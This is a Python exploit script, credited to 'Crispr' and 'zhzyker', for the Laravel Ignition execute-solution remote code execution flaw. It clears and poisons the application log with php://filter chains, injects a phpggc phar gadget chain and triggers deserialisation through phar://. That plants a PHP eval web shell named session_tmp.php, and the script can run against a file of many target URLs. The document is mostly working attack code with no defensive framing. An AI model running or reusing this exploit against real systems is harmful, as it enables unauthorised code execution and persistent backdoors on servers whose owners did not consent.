# -*- coding=utf-8 -*-
# Author : Crispr
# Alter: zhzyker
import os
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning
import argparse
import re

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class EXP:
    def __vul_check(self):
        res = requests.get(self.__url,verify=False, timeout=5)
        if res.status_code != 405 and "laravel" not in res.text:
            print("[+]Vulnerability does not exist")
            return False
        return True

    def __payload_send(self,payload):
        header = {
            "Accept": "application/json",
            "x-forwarded-for": "127.0.0.1"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "fuckfuck",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload

        #print(data)
        res = requests.post(self.__url, headers=header, json=data, verify=False, timeout=5)
        return res

    def __clear_log(self):
        payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        res = self.__payload_send(payload=payload)
        if "Allowed memory" in res.text:
            with open('result.txt', 'a') as file:
                file.write(self.__url + 'is allowed memory!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n')
        return res

    def __generate_payload(self,gadget_chain):
        generate_exp = self.__gadget_chains[gadget_chain]
        #print(generate_exp)
        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'
#         print("[+]exploit:")
        #print(exp)
        return exp

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        res = self.__payload_send("phar://../storage/logs/laravel.log/test.txt")
#         if res.status_code != 404 and "\"code\":404" not in res.text:
        if  res.status_code == 500:
            with open('urls-500.txt', 'a') as filefile:
                filefile.write(self.target + '\n')
        return res
        #return self.__payload_send("phar://../storage/logs/laravel.log/")

    def __rce(self):
        text = str(self.__unserialize_log().text)
        # if "fuck_session" in text:
       	#     print("\n---------okokokokokokokok-gogogo--------\n")
        #print(text)
        #text = text[text.index(']'):].replace("}","").replace("]","") if text.find(']') != -1 else text
        #return text
        text1 = text[:text.index('[')] if text.find('[') != -1 else text
        print(text1)
        text2 = text[text.index(']'):] if text.find(']') != -1 else text
        print(text2)
        return text

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
#             print("[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('A' * 2)
            self.__payload_send(self.__generate_payload((gadget_chain)))
            self.__decode_log()
            print("[*] " + gadget_chain + " Result:")
            #print(self.__rce())
            self.__rce()
            success = self.check_success()
            if success == True:
                break

    def check_success(self):
        url = requests.compat.urljoin(self.target, "session_tmp.php")
        res = requests.get(url,verify=False,timeout=5)
        if res.status_code == 200 and "404" not in res.text:
            print(url," is ok!!!!!gogogo-------------")
            with open('result-quchong.txt', 'a') as file:
                file.write(url + ' is okkokokokoko!!!gogogogogogo1!----------\n')
            return True
        return False

    def find_path(self,res):
        text = res.text
        # 正则表达式模式
        pattern = r'"([^"]+?)/vendor'

        # 使用正则表达式搜索
        match = re.search(pattern, text)
        if match:
            # 获取匹配的内容
            matched_content = match.group(1)  # 获取捕获组的内容
            print("匹配的内容是：", matched_content)
            self.path = matched_content + "/public/session_tmp.php"
        else:
            print("未找到匹配的内容！")


    def __init__(self, target):
        self.target = target
        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
        self.path = "session_tmp.php"
        #if not self.__vul_check():
        #   print("[-] [%s] is seems not vulnerable." % (self.target))
        #    print("[*] You can also call obj.exp() to force an attack.")
        #else:
        #    self.exp()
        self.find_path(self.__unserialize_log())
        print(self.path)
        #这里还可以增加phpggc的使用链
        self.__gadget_chains = {
            "Laravel/RCE0":r"""
             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents {} '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            """.format(self.path),
            "Laravel/RCE00":r"""
             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents session_tmp.php '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            """.format(self.path),
            "Laravel/RCE01":r"""
             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents "/www/wwwroot/csgo/service/public/session_tmp.php" '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            """.format(self.path),
            "Laravel/RCE02":r"""
             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents "/www/wwwroot/csgo_lo//public/session_tmp.php" '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            """.format(self.path),
            "Laravel/RCE03":r"""
             php -d "phar.readonly=0" ./phpggc Laravel/RCE0 file_put_contents "/www/wwwroot/api/service/public/session_tmp.php" '<? @eval($_POST["php_session_tmp"]);?>' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            """.format(self.path),
        }
        self.exp()


def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-u', '--url', help='a single url')
    parser.add_argument('-f', '--file', help='a file containing multiple urls')
    args = parser.parse_args()


    if args.url:
        EXP(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            for line in file:
                url = line.strip()
                print(url)
                try:
                    EXP(url)
                except Exception as e:
                    print(e)
    else:
        print("Please provide either a single url or a file containing multiple urls.")


if __name__ == "__main__":
    main()
